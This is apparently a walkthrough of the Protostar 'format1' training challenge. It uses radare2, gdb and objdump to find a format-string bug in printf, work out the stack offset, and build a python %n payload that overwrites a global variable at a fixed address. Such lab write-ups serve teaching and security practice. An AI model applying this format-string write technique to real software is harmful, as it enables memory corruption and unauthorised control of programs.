Let's going to see the format1 binary in radare2 to start analyzing, so as always:
    $ r2 format1
    > aaa
    > afl # list all the functions
    > s main # set position in main function
    > pdf

This function, what it does mainly is to take the pointer to argv, add 4 to that pointer and access to the value, this is the same than access to argv[1]. That pointer is then given as argument to a function called "sym.vuln". So let's move to that function to see what code is inside.
    > s sym.vuln
    > pdf

Here we can see a call to printf and a branch, and if branch is not taken a puts of "you have modified the target :)". So we more or less can know we have to modify a variable, that variable is shown by radare2 as "obj.target", but there's no way to modify it as there's no way to insert data in stack.
If we see carefully we see that our string given as parameter, is given to printf directly as parameter, so it is vulnerable to format string.

With a format string we can write in an address with the format %n that writes written bytes to the first parameter of printf, but here there's no parameters to printf directly, but printf has more parameters internall when have to create the string to print. We can know the parameters of internal parameters giving the formats %x. We could try to insert something like:

    AAAA.%08x.%08x.%08x...

Until we reach to an output like:

    AAAA.XXXXXXXXX.XXXXXXXXX.XXXXXXXX.41414141.XXXXXXXX

Where the X are dwords from printf stack, and finally we discover in which position is our AAAA argument, that it would be the offset we should give to %n to write in 0x41414141 memory address. But we will calculate with gdb:

    $ gdb -q ./format1
    > b *0x08048400 # breakpoint in call to printf
    > r AAAA.%08x.%08x
    > x/1wx $esp
    0xbffff120:     0xbffff3e0
    > x/1wx 0xbffff3e0
    0xbffff3e0:     0x41414141

As the address 0xbffff3e0, is the address to our data, and the parameters of printf start at 0xbffff120 we have to calculate the difference of both in bytes and divide by 4, to have the number of dwords we have to jump to jump into our variable:

    0xbffff3e0 - 0xbffff120 = 0x2c0 = 704 / 4 = 176 (in my machine not protostar)

So let's gonna try if we can get our AAAA in print:
    > r AAAA.%176\$08x
    AAAA.41414100

Shit we almost have it, just for one byte (but we don't move from byte to byte we move in 4 bytes alignment), no problem, add one B
    > r AAAAB.%176\$08x
    AAAAB.41414141

So okay, we have it, now we have to know the address of the variable to modify, as it is global variable, we can know it with objdump -t as given by the protostar webpage:
    $ objdump -t format1 | grep target
    08049638 g      O .bss   00000004           target

So the address is 0x08049638, let's gonna write on it again in gdb:

    > r `python -c 'print "\x38\x96\x04\x08BBB.%176\$n"'`

I had to include three 'B's instead of 1, as I had one access violation, you can check if value is correct using 'x' instead of 'n' and checking that the address is the one we want.
Now applying the same in protostar

    > r `python -c 'print "AAAABBBBB.%138\$x"'`
    AAAABBBBB.41414141

So now if we sustitute the AAAA for the address, and 'x' for 'n' we will have the message.
    > r `python -c 'print "\x38\x96\x04\x08BBBBB.%138\$x"'`
    BBBBB.8049638
    > r `python -c 'print "\x38\x96\x04\x08BBBBB.%138\$n"'`
    BBBB.you have modified the target :)

As we can see, adding some padding to the string, we make our calculated offset point to where we want, we could also play with the calculated offset, so we point to our desired address. If we don't execute from gdb, we have to do this in order to calculate the correct point, as the variables can change on the stack (because of environmental variables for example).
